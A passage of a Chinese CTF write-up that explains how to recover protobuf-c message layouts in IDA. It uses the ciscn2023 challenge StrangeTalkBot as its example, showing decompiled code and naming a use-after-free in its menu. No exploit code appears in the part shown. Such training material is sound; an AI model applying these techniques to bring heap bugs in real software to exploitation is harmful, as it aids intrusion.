class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magic，一般为0x28AAEEF9</li><li>n_fields，关系到原始的message结构内有几条记录、</li><li>fields，这个指向message内所有记录类型组成的一个数组，可以借此逆向分析message结构。</li></ol><p>如果需要具体分析一个结构体的组成,只需要关注n_fields与fields</p><p>在本例中其这样被初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>源码中找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>name，名字，变量名</li><li>id，序号，即在message结构体中的顺序（等价于位置）</li><li>label，前面标记的required等标记</li><li>type，数据类型，string还是int64等</li></ol><p>label与type都是枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment"> * more than one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment"> * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment"> * preserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><h3 id="ida结构体"><a href="#ida结构体" class="headerlink" title="ida结构体"></a>ida结构体</h3><p>为了方便在ida中查看相关结构体,可以将上述的两个结构体插入ida,当然需要处理一些不相关的数据</p><p><strong>ProtobufCMessageDescriptor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> magic;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *short_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *c_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *package_name;</span><br><span class="line">  <span class="type">size_t</span> sizeof_message;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_fields;</span><br><span class="line">  <span class="type">const</span> ProtobufCFieldDescriptor *fields;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *fields_sorted_by_name;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_field_ranges;</span><br><span class="line">  <span class="type">char</span> *field_ranges;</span><br><span class="line">  __int64 message_init;</span><br><span class="line">  <span class="type">void</span> *reserved1;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ProtobufCFieldDescriptor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">uint32_t</span> id;</span><br><span class="line">  <span class="type">int</span> label;</span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> quantifier_offset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *descriptor;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *default_value;</span><br><span class="line">  <span class="type">uint32_t</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> reserved_flags;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn2023-StrangeTalkBot"><a href="#ciscn2023-StrangeTalkBot" class="headerlink" title="ciscn2023-StrangeTalkBot"></a>ciscn2023-StrangeTalkBot</h2><p>程序主流程十分清晰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1763(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;unk_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;unk_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1329();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有沙盒不能getshell</p><p><code>sub_155D</code>是一个很明显的菜单堆,漏洞也很清晰就是一个uaf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_155D</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= <span class="number">0x21</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a4 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">if</span> ( (__int64)a3 &lt; (__int64)a4 )</span><br><span class="line">    v6 = a4;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_14FC(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_148A(a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_1347(a2, v6, a4, a5);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    sub_1329();</span><br><span class="line">  <span class="keyword">return</span> sub_13EF(a2, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个格式是不是很像protobuf的解包函数</p><p>以及结合我们在字符串中发现的一些字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000074E000000022CBINARYBF_c_service_generated_init</span><br><span class="line">.rodata:000000000000752000000023CBINARYBF_c_service_invoke_internal</span><br><span class="line">.rodata:000000000000756000000021CBINARYBF_c_message_free_unpacked</span><br><span class="line">.rodata:00000000000075900000001DCparse_packed_repeated_member</span><br><span class="line">.rodata:00000000000075B00000000DCparse_member</span><br><span class="line">.rodata:00000000000075C00000001ACBINARYBF_c_message_unpack</span><br><span class="line">.rodata:00000000000075E00000001BCpack_buffer_packed_payload</span><br><span class="line">.rodata:00000000000076000000001ACget_packed_payload_length</span><br><span class="line">.rodata:00000000000076200000001ECrepeated_field_pack_to_buffer</span><br><span class="line">.rodata:00000000000076400000001ECrequired_field_pack_to_buffer</span><br><span class="line">.rodata:000000000000766000000022CBINARYBF_c_message_pack_to_buffer</span><br><span class="line">.rodata:00000000000076900000001DCsizeof_elt_in_repeated_array</span><br><span class="line">.rodata:00000000000076B000000014Crepeated_field_pack</span><br><span class="line">.rodata:00000000000076D000000014Crequired_field_pack</span><br><span class="line">.rodata:00000000000076F000000018CBINARYBF_c_message_pack</span><br><span class="line">.rodata:00000000000077100000001FCrequired_field_get_packed_size</span><br><span class="line">.rodata:000000000000774000000023CBINARYBF_c_message_get_packed_size</span><br><span class="line">.rodata:000000000000776400000018CBINARYBF-c/BINARYBF-c.c</span><br><span class="line">.rodata:000000000000777E00000006C1.4.1</span><br><span class="line">.rodata:000000000000778400000013Ctmp == payload_len</span><br><span class="line">.rodata:000000000000779700000017Crv-&gt;descriptor != NULL</span><br><span class="line">.rodata:00000000000077B00000002ECmethod_index &lt; service-&gt;descriptor-&gt;n_methods</span><br><span class="line">.rodata:00000000000077E000000047C((message)-&gt;descriptor)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078280000002ACactual_length_size == length_size_min + 1</span><br><span class="line">.rodata:000000000000785800000036C(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC</span><br><span class="line">.rodata:00000000000078900000003CC(descriptor)-&gt;magic == BINARYBF_C__SERVICE_DESCRIPTOR_MAGIC</span><br></pre></td></tr></table></figure><p>基本能够确定这是protobuf的unpack函数,版本是1.4.1</p><p>那么逆向的关键其实就是在<code>&amp;unk_9C80</code>了</p><p>很显然这是一个<code>ProtobufCMessageDescriptor</code>对象</p><p>我们只需要在ida中手动添加一下结构体(一些不重要的类型直接用大小相等的数据类型替代)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ; Ins/Del : create/delete structure</span><br><span class="line"><span class="number">00000000</span> ; D/A<span class="comment">/*   : create structure member (data/ascii/array)</span></span><br><span class="line"><span class="comment">00000000 ; N       : rename structure or structure member</span></span><br><span class="line"><span class="comment">00000000 ; U       : delete structure member</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Sym. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Verneed. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Vernaux. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 ProtobufCMessageDescriptor struc ; (sizeof=0x78, align=0x8, copyof_19)</span></span><br><span class="line"><span class="comment">00000000                                         